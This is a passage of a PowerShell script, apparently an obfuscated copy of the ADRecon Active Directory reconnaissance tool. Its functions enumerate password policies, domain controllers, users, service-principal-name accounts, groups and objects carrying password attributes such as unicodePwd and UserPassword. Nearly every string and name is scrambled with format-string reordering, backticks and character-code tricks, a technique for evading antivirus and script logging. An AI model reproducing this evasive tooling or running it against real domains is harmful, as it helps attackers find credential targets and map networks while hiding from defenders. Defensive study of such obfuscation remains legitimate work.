                $ObjValues = @(("{1}{0}"-f 'e','Nam'), $($_."nA`me"), ("{0}{2}{1}"-f 'Appl',' To','ies'), $AppliesTo, ("{2}{4}{1}{0}{5}{3}"-f'ssword',' pa','Enforc','ory','e',' hist'), $_."p`ASSW`ORdH`IS`ToRY`CouNT", ("{2}{0}{1}{3}{4}" -f'passw','ord age (d','Maximum ','ays',')'), $_."ma`XpAs`SwOrd`AGE"."da`Ys", ("{2}{3}{5}{0}{4}{1}"-f 'swor','e (days)','Mini','mum','d ag',' pas'), $_."MINP`A`SSWO`RDAGE"."d`AyS", ("{1}{3}{0}{5}{2}{4}"-f 'mum pas','Mi','n','ni','gth','sword le'), $_."M`INPA`sSWO`RDleNgTh", ("{0}{5}{11}{6}{1}{12}{10}{9}{3}{8}{2}{7}{4}" -f'P','et','irem',' r','nts','assword',' me','e','equ','ity','mplex',' must',' co'), $_."Co`MplE`XI`Ty`ENAbleD", ("{4}{6}{3}{8}{5}{9}{1}{7}{2}{0}"-f 'n',' encr','ptio','sswo','Stor','sibl','e pa','y','rd using rever','e'), $_."RE`VeRsIbLeEnCRYpT`I`O`N`ENab`leD", (("{6}{3}{7}{4}{2}{8}{1}{0}{5}" -f 'n','i',' durati','ccount ','out','s)','A','lock','on (m')), $_."lOCk`ouTdURATI`oN"."miN`UtEs", ("{0}{6}{5}{3}{1}{4}{7}{2}" -f'A','ockou','d','l','t thresh','nt ','ccou','ol'), $_."L`OCko`UtTH`ReSH`old", (("{9}{3}{1}{8}{6}{2}{0}{5}{7}{10}{4}" -f 'afte','t','counter ','accoun',')','r ','out ','(',' lock','Reset ','mins')), $_."LoCK`outObSErvAtIonw`I`N`DoW"."miN`UtEs", ("{1}{2}{3}{0}"-f'ce','Prece','d','en'), $($_."Pr`ECeDE`N`Ce"))
                For ($i = 0; $i -lt $($ObjValues."cOU`Nt"); $i++)
                {
                    $Obj = New-Object ("{1}{0}"-f'ct','PSObje')
                    $Obj | Add-Member -MemberType ("{0}{2}{3}{1}"-f'Note','rty','P','rope') -Name ("{1}{0}"-f'icy','Pol') -Value $ObjValues[$i]
                    $Obj | Add-Member -MemberType ("{1}{0}{2}"-f'opert','NotePr','y') -Name ("{1}{0}" -f 'ue','Val') -Value $ObjValues[$i+1]
                    $i++
                    $ADPassPolObj += $Obj
                }
            }
            Remove-Variable ("{2}{0}{1}{3}" -f'D','Finepasspoli','A','cy')
        }
    }

    If ($Method -eq ("{1}{0}"-f 'P','LDA'))
    {
        If ($ObjDomain)
        {
            $objSearcher = New-Object ("{7}{8}{3}{2}{1}{0}{6}{4}{5}" -f 'irectory','ices.D','v','.DirectorySer','earc','her','S','Syste','m') $objDomain
            $ObjSearcher."pA`gE`siZE" = $PageSize
            $ObjSearcher."fi`lTEr" = (("{6}{5}{0}{3}{8}{7}{4}{1}{2}"-f 'Clas','tin','gs)','s=msD','asswordSet','ject','(ob','P','S-'))
            $ObjSearcher."Se`A`RcHsCO`pE" = ("{1}{0}" -f'ubtree','S')
            Try
            {
                $ADFinepasspolicy = $ObjSearcher.("{2}{1}{0}" -f 'ndAll','i','F').Invoke()
            }
            Catch
            {
                Write-Warning ("{7}{18}{8}{19}{0}{10}{22}{6}{15}{11}{9}{3}{14}{17}{12}{2}{16}{5}{23}{4}{21}{20}{1}{13}"-f 'ined','lic','ine Grai','ti','sw',' ','cy]','[G','DR','ra','Password','or while enume','he F','y','ng',' Err','ned',' t','et-A','FineGra',' Po','ord','Poli','Pas')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADFinepasspolicy)
            {
                If (  (  vaRIAbLe  s07d ).vAlUe::("{3}{1}{0}{2}" -f 'ectC','bj','ount','O').Invoke($ADFinepasspolicy) -ge 1)
                {
                    $ADPassPolObj = @()
                    $ADFinepasspolicy | ForEach-Object {
                    For($i=0; $i -lt $($_."Pro`Pe`RTieS".'msds-psoappliesto'."cO`UNT"); $i++)
                    {
                        $AppliesTo = $AppliesTo + "," + $_."p`R`OperTiES".'msds-psoappliesto'[$i]
                    }
                    If ($null -ne $AppliesTo)
                    {
                        $AppliesTo = $AppliesTo.("{0}{2}{1}"-f'Trim','art','St').Invoke(",")
                    }
                        $ObjValues = @(("{0}{1}" -f 'Nam','e'), $($_."PrOPE`Rt`ieS"."nA`mE"), ("{1}{2}{0}"-f'o','Appli','es T'), $AppliesTo, ("{2}{3}{0}{1}{4}{5}" -f 'orce ','p','E','nf','assword ','history'), $($_."prop`ERti`eS".'msds-passwordhistorylength'), (("{5}{2}{1}{4}{3}{0}" -f's)','um','xim','ay',' password age (d','Ma')), $($($_."PR`Op`erT`ies".'msds-maximumpasswordage') /-864000000000), ("{6}{1}{5}{3}{2}{0}{4}" -f 's','um pas','age (day','rd ',')','swo','Minim'), $($($_."pr`opERti`Es".'msds-minimumpasswordage') /-864000000000), ("{6}{5}{4}{0}{3}{1}{2}"-f 'mum passw','g','th','ord len','ni','i','M'), $($_."P`Roper`TiEs".'msds-minimumpasswordlength'), ("{0}{1}{3}{5}{8}{4}{6}{10}{7}{2}{9}" -f'Passwo','rd ','equir','must','lex',' m','ity','r','eet comp','ements',' '), $($_."PrO`pe`RTiES".'msds-passwordcomplexityenabled'), ("{2}{4}{7}{0}{6}{3}{5}{1}"-f 'ng reve','tion','Store p','sible e','asswo','ncryp','r','rd usi'), $($_."proPer`T`ies".'msds-passwordreversibleencryptionenabled'), (("{0}{3}{1}{2}{4}{6}{5}" -f'Ac','ckou','t d','count lo','ura','mins)','tion (')), $($($_."PrOpE`Rti`eS".'msds-lockoutduration')/-600000000), ("{1}{3}{2}{4}{0}{5}"-f 's','Account','r',' lockout th','e','hold'), $($_."Pro`PErt`ies".'msds-lockoutthreshold'), (("{2}{4}{3}{10}{5}{7}{8}{9}{12}{11}{0}{1}{6}"-f'min','s','R','s','e','t accoun',')','t l','o','ckout','e','unter after (',' co')), $($($_."p`RoPEr`Ties".'msds-lockoutobservationwindow')/-600000000), ("{0}{1}{2}" -f'P','reced','ence'), $($_."Pro`P`ErtIES".'msds-passwordsettingsprecedence'))
                        For ($i = 0; $i -lt $($ObjValues."c`ount"); $i++)
                        {
                            $Obj = New-Object ("{1}{0}{2}" -f'SObj','P','ect')
                            $Obj | Add-Member -MemberType ("{2}{0}{1}{3}"-f'ro','pe','NoteP','rty') -Name ("{0}{1}{2}" -f'P','olic','y') -Value $ObjValues[$i]
                            $Obj | Add-Member -MemberType ("{0}{2}{1}{3}" -f 'N','Propert','ote','y') -Name ("{1}{0}" -f 'ue','Val') -Value $ObjValues[$i+1]
                            $i++
                            $ADPassPolObj += $Obj
                        }
                    }
                }
                Remove-Variable ("{4}{2}{1}{0}{3}" -f'spoli','inepas','F','cy','AD')
            }
        }
    }

    If ($ADPassPolObj)
    {
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function gET-AD`RdO`m`AiNcOn`TROL`L`er
{

    param(
        [Parameter(MANDaTorY = $true)]
        [string] $Method,

        [Parameter(mAnDatOry = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MandAtORY = $false)]
        [Management.Automation.PSCredential] $Credential =  $K49p::"E`mPTY"
    )

    If ($Method -eq ("{1}{0}"-f'S','ADW'))
    {
        Try
        {
            $ADDomainControllers = @( Get-ADDomainController -Filter * )
        }
        Catch
        {
            Write-Warning ("{15}{0}{9}{14}{11}{7}{5}{6}{4}{2}{16}{10}{13}{1}{12}{8}{3}" -f 'Get-ADR','nControl','hile enume','cts','w','Erro','r ','oller] ','Obje','Doma','ting Doma','ntr','ler ','i','inCo','[','ra')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        
        If ($ADDomainControllers)
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers)) "
            $DCObj =  (cHIldiTem vaRiaBlE:jWb18).VaLUE::("{3}{2}{1}{5}{4}{0}" -f 'rser','ainCo','om','D','trollerPa','n').Invoke($ADDomainControllers, $Threads)
            Remove-Variable ("{1}{2}{3}{0}"-f 'ontrollers','ADDo','ma','inC')
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LD','AP'))
    {
        If ($Credential -ne   (iTEm  ("V"+"A"+"RI"+"AbLE:K49P")  ).VAluE::"EM`pTY")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."diSTIn`GuisH`eDn`A`me")
            $DomainContext = New-Object ("{10}{9}{7}{6}{5}{8}{2}{1}{4}{0}{3}{11}" -f 'te','irect','ry.D','x','oryCon','es.ActiveDire','Servic','y','cto','em.Director','Syst','t')(("{0}{1}" -f 'Do','main'),$($DomainFQDN),$($Credential."USErn`A`ME"),$($Credential.("{4}{0}{1}{3}{2}" -f 'r','kCre','l','dentia','GetNetwo').Invoke()."Pa`ssW`ORD"))
            Try
            {
                $ADDomain =  (GeT-vARiaBLE iHyJ8Z).valuE::("{1}{2}{3}{0}"-f 'in','GetD','o','ma').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{6}{1}{11}{5}{13}{2}{8}{4}{7}{9}{12}{10}{3}{14}{0}"-f'ontext','t-A','inC','ain','oller] ','RDo','[Ge','Erro','ontr','r ','ting Dom','D','get','ma',' C')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ("{2}{0}{1}"-f'Cont','ext','Domain')
        }
        Else
        {
            $ADDomain =  ( ChiLdItEm ('va'+'rI'+'abL'+'e:iHY'+'J8Z') ).vAlUe::("{0}{3}{2}{4}{1}"-f'GetC','n','tD','urren','omai').Invoke()
        }

        If ($ADDomain."DoMain`Co`NtRO`LLERs")
        {
            Write-Verbose "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers)) "
            $DCObj =  $s07d::("{2}{1}{4}{3}{0}" -f'lerParser','om','D','trol','ainCon').Invoke($ADDomain."Do`m`AI`Nc`oNtroLLeRS", $Threads)
            Remove-Variable ("{0}{2}{1}"-f 'A','n','DDomai')
        }
    }

    If ($DCObj)
    {
        Return $DCObj
    }
    Else
    {
        Return $null
    }
}

Function GE`T-a`DRusEr
{

    param(
        [Parameter(manDaTORy = $true)]
        [string] $Method,

        [Parameter(MAnDAtoRY = $true)]
        [DateTime] $date,

        [Parameter(mANdAtORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MANdatOrY = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(MANdaTORy = $true)]
        [int] $PageSize,

        [Parameter(mandatoRy = $false)]
        [int] $Threads = 10,

        [Parameter(mAnDatORY = $false)]
        [int] $ADRUsers = $true,

        [Parameter(mAnDatORY = $false)]
        [int] $ADRUserSPNs = $false
    )

    If ($Method -eq ("{1}{0}"-f'DWS','A'))
    {
        If (!$ADRUsers)
        {
            Try
            {
                $ADUsers = @( Get-ADObject -LDAPFilter ((("{13}{0}{14}{2}{12}{9}{1}{3}{6}{10}{11}{15}{5}{8}{7}{4}" -f'&(','05','mAcco','3','))','c','0636','me=*','ipalNa','ype=8','8)(serv','icePri','untT','(','sa','n'))) -ResultPageSize $PageSize -Properties ("{1}{0}"-f 'me','Na'),("{1}{0}{3}{2}"-f's','De','ion','cript'),("{1}{2}{0}"-f 'erOf','mem','b'),("{4}{2}{0}{1}{3}" -f 't','N','MAccoun','ame','sA'),("{4}{3}{2}{0}{1}"-f 'pal','Name','ci','ervicePrin','s'),("{2}{3}{1}{4}{0}" -f'ID','r','pr','imaryG','oup'),("{0}{2}{1}" -f 'p','et','wdLastS'),("{0}{3}{1}{4}{2}" -f'userA','ount','ol','cc','Contr') )
            }
            Catch
            {
                Write-Warning ("{5}{0}{14}{11}{10}{9}{3}{2}{1}{13}{6}{8}{12}{4}{7}"-f 'Get-ADRUse',' ','or while','r','bjec','[','numerati','ts','ng Use','r','E',' ','rSPN O','e','r]')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADUsers = @( Get-ADUser -Filter * -ResultPageSize $PageSize -Properties ("{4}{0}{2}{5}{1}{3}" -f 'countE','rationD','x','ate','Ac','pi'),("{4}{3}{0}{1}{2}" -f 'tEx','pir','es','coun','ac'),("{1}{0}{3}{5}{2}{4}" -f'cc','A','Del','ount','egated','Not'),("{2}{0}{1}"-f 'inCo','unt','Adm'),("{2}{1}{4}{3}{6}{0}{5}"-f 'dEnc','low','Al','eversiblePas','R','ryption','swor'),('c'),("{3}{4}{2}{0}{1}"-f 'sswo','rd','hangePa','Canno','tC'),("{1}{0}{2}{3}"-f 'ni','Cano','cal','Name'),("{0}{1}" -f'C','ompany'),("{2}{1}{0}{3}"-f'men','part','De','t'),("{2}{0}{1}{3}"-f 'crip','tio','Des','n'),("{4}{0}{1}{3}{2}"-f 'is','tinguishe','ame','dN','D'),("{5}{4}{3}{0}{1}{2}"-f 'reA','ut','h','P','re','DoesNotRequi'),("{0}{1}"-f 'Enable','d'),("{1}{2}{0}" -f'me','givenN','a'),("{2}{0}{1}{4}{3}" -f'e','Directo','hom','y','r'),("{0}{1}"-f'Inf','o'),("{2}{0}{1}"-f'nDat','e','LastLogo'),("{2}{0}{3}{1}" -f 'Lo','mestamp','last','gonTi'),("{1}{0}{2}" -f'ockedO','L','ut'),("{3}{0}{2}{4}{1}"-f'gonWo','ons','rkstat','Lo','i'),("{1}{0}" -f 'ail','m'),("{2}{1}{0}"-f 'nager','a','M'),("{1}{0}{2}" -f 'mb','me','erOf'),("{1}{2}{0}" -f 'ame','middl','eN'),("{1}{0}"-f'bile','mo'),("{1}{2}{3}{5}{0}{4}" -f'ga','msDS-','AllowedToD','e','teTo','le'),("{0}{4}{2}{5}{1}{3}{6}"-f 'msD','ncryptio','Supp','nTyp','S-','ortedE','es'),("{0}{1}" -f'Nam','e'),("{0}{4}{1}{3}{2}" -f'Pa','sword','ired','Exp','s'),("{3}{0}{1}{2}{4}" -f 'swo','rdLast','Se','Pas','t'),("{1}{3}{0}{4}{2}"-f'rdNeve','Passw','s','o','rExpire'),("{3}{4}{1}{0}{2}" -f 'qui','NotRe','red','Passw','ord'),("{1}{4}{0}{2}{3}" -f'ryG','pri','roupI','D','ma'),("{1}{0}{2}" -f 'ro','p','filePath'),("{1}{2}{0}" -f'tset','pwdla','s'),("{1}{2}{0}{3}"-f'Nam','SamA','ccount','e'),("{3}{1}{0}{2}"-f'i','r','ptPath','Sc'),("{2}{1}{0}{3}{4}{5}"-f 'rviceP','e','s','rin','cipa','lName'),("{0}{1}"-f 'SI','D'),("{2}{1}{0}" -f'y','stor','SIDHi'),("{4}{1}{0}{3}{2}" -f'i','LogonRequ','ed','r','Smartcard'),('sn'),("{0}{1}"-f 'Titl','e'),("{1}{0}{3}{4}{5}{2}"-f 'st','Tru','on','edForDel','eg','ati'),("{2}{0}{4}{3}{1}{5}{7}{6}" -f'Au','r','TrustedTo','hFo','t','Delegat','on','i'),("{0}{2}{1}{3}" -f 'UseD','SKeyOnl','E','y'),("{0}{2}{3}{1}"-f 'UserA','l','ccountCo','ntro'),("{0}{1}{2}" -f 'w','henCh','anged'),("{2}{1}{3}{0}"-f'ted','h','w','enCrea') )
            }
            Catch
            {
                Write-Warning ("{9}{13}{14}{1}{6}{3}{8}{7}{4}{2}{5}{10}{0}{12}{11}" -f 'j','rro','se','hile e',' U','r','r w','ng','numerati','[Get-AD',' Ob','cts','e','RUs','er] E')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                Try
                {
                    $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
                    $PassMaxAge = $ADpasspolicy."mA`XpaS`s`wordage"."DA`YS"
                    Remove-Variable ("{1}{2}{0}"-f 'policy','ADpa','ss')
                }
                Catch
                {
                    Write-Warning ("{1}{9}{7}{5}{3}{10}{11}{0}{16}{6}{17}{8}{14}{12}{13}{2}{18}{4}{15}" -f' from ','[Get-ADRU',' ','x ','g value ','Error retrieving Ma','e Default ','r] ','d','se','Password Ag','e','Poli','cy.',' ','as 90 days','th','Passwor','Usin')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj =   ( ChildITem  ("varia"+"bL"+"e"+":j"+"wB18")).vaLUe::("{3}{2}{0}{1}"-f 'rs','er','rPa','Use').Invoke($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj =  ( get-VArIaBLE  ("j"+"Wb18")  ).valuE::("{0}{1}{2}" -f'U','serSP','NParser').Invoke($ADUsers, $Threads)
            }
            Remove-Variable ("{0}{1}" -f 'ADU','sers')
        }
    }

    If ($Method -eq ("{0}{1}"-f 'L','DAP'))
    {
        If (!$ADRUsers)
        {
            $objSearcher = New-Object ("{4}{3}{5}{7}{6}{10}{9}{0}{8}{1}{2}"-f'ervic','ectorySearche','r','em','Syst','.D','re','i','es.Dir','S','ctory') $objDomain
            $ObjSearcher."pAGes`I`ZE" = $PageSize
            $ObjSearcher."f`ilTer" = ("{4}{3}{5}{2}{12}{8}{7}{9}{1}{6}{0}{11}{10}" -f 'palN','servicePr','cou','(sa','(&','mAc','inci','e=80','yp','5306368)(','me=*))','a','ntT')
            $ObjSearcher."PrOpErT`IesTO`L`oAd".("{0}{2}{1}" -f'AddRan','e','g').Invoke((("{0}{1}"-f'n','ame'),("{1}{0}{3}{2}"-f'ri','desc','ion','pt'),("{2}{1}{0}" -f 'f','o','member'),("{4}{1}{2}{3}{0}" -f'name','o','u','nt','samacc'),("{4}{0}{3}{1}{2}" -f 'erv','nc','ipalname','icepri','s'),("{3}{1}{2}{0}" -f 'pid','arygr','ou','prim'),("{2}{1}{0}" -f 'stset','dla','pw'),("{2}{5}{4}{0}{3}{1}" -f'unt','ol','us','contr','acco','er')))
            $ObjSearcher."SEA`RC`hSCOpE" = ("{0}{2}{1}" -f'Su','ree','bt')
            Try
            {
                $ADUsers = $ObjSearcher.("{2}{0}{1}" -f'ind','All','F').Invoke()
            }
            Catch
            {
                Write-Warning ("{3}{11}{0}{10}{9}{2}{1}{5}{6}{7}{8}{12}{4}{14}{13}"-f 'ser','um','Error while en','[Ge','N ','eratin','g U','s','e',' ',']','t-ADRU','rSP','jects','Ob')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{1}{0}"-f 'ose','disp').Invoke()
        }
        Else
        {
            $objSearcher = New-Object ("{6}{3}{2}{7}{5}{10}{8}{0}{1}{9}{4}" -f '.Director','y','t','ys','er','cto','S','em.Dire','ces','Search','ryServi') $objDomain
            $ObjSearcher."P`Age`SizE" = $PageSize
            $ObjSearcher."fil`Ter" = ("{0}{6}{4}{1}{5}{2}{3}" -f '(sa','Type=805','636','8)','t','30','mAccoun')
            
            $ObjSearcher."sEc`URI`T`yMAs`Ks" = [System.DirectoryServices.SecurityMasks]("{1}{0}" -f'acl','D')
            $ObjSearcher."pro`PeRt`i`eS`TOl`OAd".("{0}{1}{2}" -f 'AddRa','ng','e').Invoke((("{0}{2}{1}"-f'accou','pires','ntEx'),("{1}{2}{0}"-f 'count','adm','in'),"c",("{0}{2}{1}{3}"-f 'can','alna','onic','me'),("{1}{0}"-f 'mpany','co'),("{0}{1}{2}" -f'd','epart','ment'),("{0}{1}{2}"-f'des','cript','ion'),("{1}{4}{3}{5}{2}{0}" -f 'e','distingui','am','he','s','dn'),("{2}{1}{0}" -f 'e','enNam','giv'),("{0}{2}{1}" -f'homed','rectory','i'),("{0}{1}" -f 'in','fo'),("{0}{2}{1}{3}" -f 'last','timest','Logon','amp'),("{0}{1}"-f'm','ail'),("{0}{1}" -f'm','anager'),("{0}{1}"-f 'membe','rof'),("{2}{0}{1}" -f'iddleN','ame','m'),("{0}{1}" -f 'mob','ile'),("{5}{0}{4}{2}{3}{1}" -f 'A','eTo','low','edToDelegat','l','msDS-'),("{7}{2}{5}{4}{1}{8}{3}{0}{6}" -f'p','po','-S','ncryptionTy','p','u','es','msDS','rtedE'),("{0}{1}"-f 'nam','e'),("{3}{1}{0}{2}" -f 'ydescripto','curit','r','ntse'),("{1}{0}{2}"-f'ec','obj','tsid'),("{1}{2}{0}"-f'rygroupid','p','rima'),("{0}{3}{1}{2}" -f'p','lep','ath','rofi'),("{1}{0}{2}"-f 'wdLas','p','tSet'),("{2}{0}{1}{3}" -f 'N','am','samaccount','e'),("{0}{1}{3}{2}" -f 's','criptpa','h','t'),("{2}{1}{0}{4}{3}"-f'vicep','r','se','incipalname','r'),("{1}{0}{2}"-f 'h','sid','istory'),"sn",("{0}{1}"-f'tit','le'),("{4}{1}{2}{3}{0}" -f'ol','ac','countcont','r','user'),("{0}{3}{1}{2}"-f'userwork','o','ns','stati'),("{2}{1}{3}{0}"-f'ged','a','whench','n'),("{0}{1}{2}{3}" -f 'wh','encre','a','ted')))
            $ObjSearcher."S`e`ARch`scOpE" = ("{2}{0}{1}"-f 'u','btree','S')
            Try
            {
                $ADUsers = $ObjSearcher.("{2}{1}{0}"-f 'l','l','FindA').Invoke()
            }
            Catch
            {
                Write-Warning ("{1}{4}{3}{6}{7}{11}{0}{9}{12}{5}{10}{8}{2}" -f'whi','[Get-ADR','bjects','ser] ','U','mer','Er','ro','ng User O','le ','ati','r ','enu')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{0}{1}{2}" -f 'dispo','s','e').Invoke()
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                $PassMaxAge = $($ObjDomain.("{1}{2}{5}{3}{0}{4}" -f '6','Convert','LargeIn','ToInt','4','teger').Invoke($ObjDomain."MAx`PWDA`gE"."V`ALuE") /-864000000000)
                If (-Not $PassMaxAge)
                {
                    Write-Warning ("{8}{6}{22}{11}{18}{21}{16}{13}{0}{1}{17}{9}{12}{24}{2}{10}{4}{23}{15}{26}{5}{25}{7}{19}{20}{14}{3}"-f'o','rd','swo','s','Po','Usi','et',' valu','[G','e from the','rd ','r',' D','ssw','90 day','ic','x Pa',' Ag',']','e ','as ',' Error retrieving Ma','-ADRUse','l','efault Pas','ng','y. ')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj =   $S07d::("{1}{2}{0}" -f'rParser','U','se').Invoke($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj =  $S07D::("{3}{2}{0}{4}{1}"-f 'ars','r','NP','UserSP','e').Invoke($ADUsers, $Threads)
            }
            Remove-Variable ("{2}{0}{1}"-f'DUser','s','A')
        }
    }

    If ($UserObj)
    {
        Export-ADR -ADRObj $UserObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}"-f 'U','sers')
        Remove-Variable ("{1}{0}{2}" -f'e','Us','rObj')
    }
    If ($UserSPNObj)
    {
        Export-ADR -ADRObj $UserSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}" -f'SPNs','User')
        Remove-Variable ("{2}{1}{0}" -f'SPNObj','r','Use')
    }
}


Function g`eT-aDrp`A`SsWO`R`dATtrIBU`TES
{

    param(
        [Parameter(ManDAToRy = $true)]
        [string] $Method,

        [Parameter(mANdAToRy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MAndatORY = $true)]
        [int] $PageSize
    )

    If ($Method -eq ("{1}{0}" -f'WS','AD'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter ((("{10}{6}{2}{0}{1}{13}{7}{11}{4}{12}{5}{3}{8}{9}" -f'Password','=*)(UnixUser','User','U3','nicodePwd=*)(m','SF','bp(','rd=','0Password=','*))','(q','*)(u','s','Passwo'))  -rEPlacE ([ChAr]113+[ChAr]98+[ChAr]112),[ChAr]124) -ResultPageSize $PageSize -Properties ('*')
        }
        Catch
        {
            Write-Warning ("{12}{6}{8}{4}{11}{7}{9}{2}{10}{0}{3}{13}{5}{1}"-f 'nume','butes','or whil','rating P','wordAt','Attri','s','] Er','s','r','e e','tributes','[Get-ADRPa','assword ')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            Write-Warning "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            $UserObj = $ADUsers
            Remove-Variable ("{2}{0}{1}"-f'se','rs','ADU')
        }
    }

    If ($Method -eq ("{1}{0}"-f'DAP','L'))
    {
        $objSearcher = New-Object ("{4}{3}{2}{8}{7}{6}{5}{0}{1}{9}{10}" -f '.Director','ySe','i','.D','System','ces','vi','torySer','rec','a','rcher') $objDomain
        $ObjSearcher."p`A`GeSizE" = $PageSize
        $ObjSearcher."f`ILt`eR" = (((("{6}{14}{5}{7}{1}{11}{9}{8}{3}{2}{10}{13}{0}{12}{15}{16}{4}" -f'msSF','erPas','icodeP','*)(un','*))','*)(U','(ZwC(UserPassword','nixUs','d=','r','w','swo','U30Pa','d=*)(','=','ssw','ord='))-CREpLACE  'ZwC',[cHar]124))
        $ObjSearcher."SEArCh`s`COPE" = ("{2}{0}{1}" -f'r','ee','Subt')
        Try
        {
            $ADUsers = $ObjSearcher.("{0}{1}{2}"-f'Fi','ndA','ll').Invoke()
        }
        Catch
        {
            Write-Warning ("{1}{11}{7}{2}{0}{3}{4}{6}{10}{9}{5}{8}" -f ' ','[Get-ADRPasswordAtt','Error while','enume','r','Att','ating Pa','ibutes] ','ributes','d ','sswor','r')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}{2}"-f'isp','d','ose').Invoke()

        If ($ADUsers)
        {
            $cnt =  (VariaBlE ("s0"+"7D")  -VaLueo )::("{1}{0}{2}" -f'ec','Obj','tCount').Invoke($ADUsers)
            If ($cnt -gt 0)
            {
                Write-Warning ('[*'+'] '+'To'+'tal '+'Pas'+'sword'+'A'+'ttribu'+'t'+'e '+'Object'+'s:'+' '+"$cnt")
            }
            $UserObj = $ADUsers
            Remove-Variable ("{0}{1}{2}"-f'A','DUse','rs')
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get`-ADRGR`oUP
{

    param(
        [Parameter(MANDATOry = $true)]
        [string] $Method,

        [Parameter(MAndATORy = $true)]
        [DateTime] $date,

        [Parameter(manDATORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mandAtory = $true)]
        [int] $PageSize,

        [Parameter(maNdATORY = $false)]
        [int] $Threads = 10,

        [Parameter(MandAToRy = $true)]
        [string] $ADROutputDir,

        [Parameter(mAndATOry = $true)]
        [array] $OutputType,

        [Parameter(mAndATORy = $false)]
        [bool] $ADRGroups = $true,

        [Parameter(mandAToRY = $false)]
        [bool] $ADRGroupChanges = $false
    )

    If ($Method -eq ("{1}{0}" -f'DWS','A'))
    {
        Try
        {
            $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties ("{2}{1}{0}" -f'Count','n','Admi'),("{0}{2}{3}{1}"-f 'C','lName','anon','ica'),("{1}{3}{0}{2}{4}"-f 'ished','Distin','N','gu','ame'),("{3}{1}{0}{2}"-f 'ip','cr','tion','Des'),("{0}{1}{2}"-f 'GroupC','ate','gory'),("{0}{3}{2}{1}"-f'Gr','cope','upS','o'),("{0}{2}{1}" -f 'S','tName','amAccoun'),("{1}{0}"-f'D','SI'),("{3}{0}{1}{2}"-f 'IDHi','stor','y','S'),("{2}{1}{0}"-f 'edBy','anag','m'),("{2}{1}{5}{6}{3}{0}{4}" -f'Me','S','msD','plValue','taData','-','Re'),("{2}{1}{0}"-f'ged','henChan','w'),("{1}{2}{0}"-f 'reated','whe','nC') )
        }
        Catch
        {
            Write-Warning ("{3}{8}{5}{0}{6}{10}{2}{4}{9}{7}{1}" -f'up] Error','p Objects','e','[Get-A','ratin','o',' whi','u','DRGr','g Gro','le enum')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj =   $jWb18::("{1}{0}{2}" -f'ro','G','upParser').Invoke($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj =   ( vaRIABLe JWB18  -VaLueoN )::("{1}{3}{0}{2}" -f 'ChangePars','G','er','roup').Invoke($ADGroups, $date, $Threads)
            }
            Remove-Variable ("{0}{2}{1}" -f 'AD','ps','Grou')
            Remove-Variable ("{2}{0}{1}"-f 'R','Groups','AD')
            Remove-Variable ("{2}{1}{3}{0}" -f 'es','Cha','ADRGroup','ng')
        }
    }

    If ($Method -eq ("{1}{0}"-f'P','LDA'))
    {
        $objSearcher = New-Object ("{6}{1}{7}{3}{5}{11}{2}{8}{4}{9}{10}{0}" -f 'er','em.','c','rectory','Dire','S','Syst','Di','es.','ctorySear','ch','ervi') $objDomain
        $ObjSearcher."P`Ag`eSIze" = $PageSize
        $ObjSearcher."FILt`er" = ("{0}{2}{5}{4}{3}{1}" -f'(ob','lass=group)','j','tC','c','e')
